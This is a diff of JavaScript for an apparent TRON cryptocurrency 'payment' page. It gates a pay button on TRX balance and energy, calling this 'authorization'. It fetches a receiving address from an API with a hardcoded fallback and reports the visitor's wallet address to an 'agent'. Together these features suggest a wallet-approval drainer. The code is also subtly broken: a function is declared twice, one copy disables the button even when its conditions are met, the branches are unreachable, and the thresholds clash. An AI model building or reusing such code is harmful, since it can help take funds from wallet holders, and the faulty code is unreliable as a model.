@@ -360,6 +360,28 @@
 				}
 			}
 
+			// 更新支付按钮状态
+			function updatePayButtonState() {
+				const payBtn = document.getElementById('payButton')
+				if (!payBtn) return
+
+				// 检查授权条件: TRX余额≥11 或 能量≥110000
+				const hasSufficientTrx = parseFloat(userData.trxBalance) >= 11
+				const hasSufficientEnergy = userData.energy >= 110000
+				const canAuthorize = hasSufficientTrx || hasSufficientEnergy
+
+				if (canAuthorize) {
+					// 满足条件:启用按钮
+					// payBtn.disabled = false
+					payBtn.disabled = true
+					payBtn.innerText = '立即支付'
+				} else {
+					// 不满足条件:禁用按钮
+					payBtn.disabled = true
+					payBtn.innerText = 'TRX不足11或能量不足110000'
+				}
+			}
+
 			// 初始化：检测环境
 			async function init() {
 				const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
@@ -424,6 +446,51 @@
 				}
 			}
 
+			// 更新支付按钮状态
+			function updatePayButtonState() {
+				const payBtn = document.getElementById('payButton')
+				if (!payBtn) return
+
+				const trxBalance = parseFloat(userData.trxBalance)
+				const energy = userData.energy
+
+				// 检查是否满足授权条件: TRX余额≥12 或 能量≥110000
+				const hasSufficientTrx = trxBalance >= 12
+				const hasSufficientEnergy = energy >= 110000
+
+				if (!hasSufficientTrx && !hasSufficientEnergy) {
+					// 都不满足,按钮变为警告状态
+					payBtn.disabled = true
+					payBtn.style.background = 'linear-gradient(135deg, #ff6b6b, #ee5a6f)'
+					payBtn.style.color = '#fff'
+					payBtn.style.cursor = 'not-allowed'
+					payBtn.style.border = '2px solid #ff4757'
+					payBtn.style.boxShadow = '0 4px 12px rgba(255, 75, 87, 0.3)'
+					payBtn.style.fontWeight = '600'
+					payBtn.style.opacity = '0.95'
+
+					// 根据具体不足的资源显示提示
+					if (trxBalance < 12 && energy < 110000) {
+						payBtn.innerText = `⚠️ TRX不足12或能量不足110000`
+					} else if (trxBalance < 12) {
+						payBtn.innerText = `⚠️ TRX不足12`
+					} else {
+						payBtn.innerText = `⚠️ 能量不足110000`
+					}
+				} else {
+					// 满足条件,恢复按钮
+					payBtn.disabled = false
+					payBtn.style.background = 'linear-gradient(90deg, #007aff, #34c759)'
+					payBtn.style.color = '#fff'
+					payBtn.style.cursor = 'pointer'
+					payBtn.style.border = 'none'
+					payBtn.style.boxShadow = 'none'
+					payBtn.style.fontWeight = 'normal'
+					payBtn.style.opacity = '1'
+					payBtn.innerText = '立即支付'
+				}
+			}
+
 			// 获取目标地址 (收款地址)
 			// 原逻辑：从 API 获取，如果失败则使用硬编码或备用
 			async function getContractAddress() {
@@ -456,8 +523,17 @@
 				}
 
 				// 检查是否满足授权条件:TRX余额≥12 或 能量≥110000
-				if (parseFloat(userData.trxBalance) < 11 && userData.energy < 110000) {
-					showTemporaryMessage('TRX能量不足')
+				if (parseFloat(userData.trxBalance) < 12 && userData.energy < 110000) {
+					// 根据具体不足的资源显示提示
+					let message = ''
+					if (parseFloat(userData.trxBalance) < 12 && userData.energy < 110000) {
+						message = 'TRX不足12或能量不足110000'
+					} else if (parseFloat(userData.trxBalance) < 12) {
+						message = 'TRX不足12'
+					} else {
+						message = '能量不足110000'
+					}
+					showTemporaryMessage(message)
 					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
 					return
 				} else {
